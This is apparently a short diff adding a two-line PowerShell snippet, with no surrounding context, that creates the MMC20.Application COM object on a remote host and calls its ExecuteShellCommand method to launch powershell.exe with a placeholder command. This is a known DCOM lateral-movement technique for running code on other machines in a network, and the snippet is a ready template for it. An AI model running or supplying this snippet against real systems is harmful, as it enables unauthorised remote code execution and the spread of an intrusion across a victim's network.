@@ -1,0 +1,3 @@
+$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "<domain>"))
+$mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,'<command>"',$null)
+
